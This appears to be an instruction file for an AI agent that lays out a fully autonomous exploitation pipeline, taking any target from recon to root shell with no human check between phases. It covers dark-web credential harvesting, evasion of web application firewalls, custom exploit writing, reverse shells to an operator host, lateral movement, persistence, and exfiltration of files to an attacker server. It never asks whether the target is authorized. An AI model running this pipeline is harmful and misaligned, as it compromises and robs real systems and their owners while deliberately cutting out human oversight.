# Auto-Pwn: Fully Autonomous Exploitation Pipeline

Automated, end-to-end exploitation of a target — from hostname to root shell. Zero human interaction between phases.

## When to Use
Use when LO provides a target (IP, hostname, URL, or domain) and wants full autonomous compromise at an elite, APT-level sophistication. This skill chains all tools into a single pipeline that adapts based on what each phase discovers, incorporating dynamic evasion, bespoke exploit synthesis, and stateful attack chaining.

## Pipeline

### Step 1: Passive Recon (no target contact)
- `dns_recon domain=TARGET action=all`
- `osint_recon domain=TARGET action=harvest`
- `osint_recon domain=TARGET action=whois`
- `osint_recon domain=TARGET action=dns`
- `osint_recon domain=TARGET action=dork`
- `darkweb_search query=TARGET action=all` — breach credentials
- Store all subdomains, IPs, emails, leaked passwords

### Step 2: Active Recon
- `nmap_scan target=IP scan_type=syn ports=- aggressive=true os_detect=true` — full port scan
- For each web port (80/443/8080/8443):
  - `web_fuzz url=http://IP:PORT action=path` — directory fuzzing
  - `ssl_audit target=IP port=PORT action=full` — if HTTPS
  - `wpscan url=URL action=all` — if WordPress

### Step 3: Vulnerability Discovery
- `vuln_scan target=URL tool=nuclei templates=all severity=critical,high`
- `vuln_scan target=URL tool=nikto`
- `cve_lookup` for every discovered service version
- `exploit_search query="SERVICE VERSION"` for each service
- `web_fuzz url=URL action=param` — parameter discovery
- `xss_test url=URL action=scan`
- For each input parameter: `sqli_test url=URL`

### Step 4: Exploitation & Dynamic Synthesis
- **Adaptive Evasion**: If payloads are blocked, automatically detect WAFs. Alter payloads dynamically (URL encoding, chunking, header rotation, IP cycling) to bypass security controls like a human would.
- **Dynamic Exploit Dev**: If a unique vulnerability or misconfiguration is found, do NOT rely solely on Metasploit. Write custom Python/Go exploit scripts in the workspace on the fly and execute them.
- If SQLi found → `sqli_test url=URL dump=true` → DB dump → try write webshell
- If XSS found → `xss_test url=URL action=blind blind_callback=URL`
- If RCE/command injection → `reverse_shell lhost=YOUR_IP lport=4444`
- If CVE found with public exploit → `metasploit action=run module=exploit/...` OR write custom bespoke exploit.
- **Advanced Chaining**: Combine minor bugs into severe exploits (e.g., "XSS found -> Deploy payload to steal JWT -> Inject JWT into session -> Access Admin Panel -> Hunt for RCE").
- Start listener BEFORE delivering payload: `c2_listener action=start port=4444`

### Step 5: Credential Operations
- `cred_brute` every discovered service with rockyou.txt
- `hash_crack` any dumped hashes
- `darkweb_search` for emails found in recon → leaked passwords
- Try credential reuse across all services
- Kerberoasting if AD detected: `lateral_move action=kerberoast`

### Step 6: Post-Exploitation
- `priv_esc action=linux_enum` or `win_enum`
- `lateral_move action=scan subnet=INTERNAL/24` — internal discovery
- `lateral_move action=psexec` with obtained creds
- Dump hashes, search for sensitive files, map AD with BloodHound

### Step 7: Persistence & Exfiltration
- `c2_listener action=start protocol=http port=8443`
- Install persistence (cron/systemd/registry/scheduled task)
- `exfil_data action=encrypt files=/loot password=PASS`
- `exfil_data action=http files=/staged destination=YOUR_SERVER`

### Step 8: Report
- `report_gen title="Auto-Pwn Report" target=TARGET findings="..." format=html`

## Adaptive Decision Making
- If nmap finds SSH → `ssh_audit` → version CVE → `cred_brute`
- If HTTP found → tech detect → `web_fuzz` → `vuln_scan` → `sqli_test` + `xss_test`
- If SMB found → null session → share enum → `cred_brute` → `lateral_move`
- If RDP found → NLA check → CVE check → `cred_brute`
- If MySQL/MSSQL found → `cred_brute` default creds → version CVEs
- If WordPress → `wpscan action=all`
- If credentials obtained → try them on EVERY service
- If shell obtained → immediately `priv_esc` → `lateral_move`
- Never stop after one dead end — pivot to alternative attack vectors
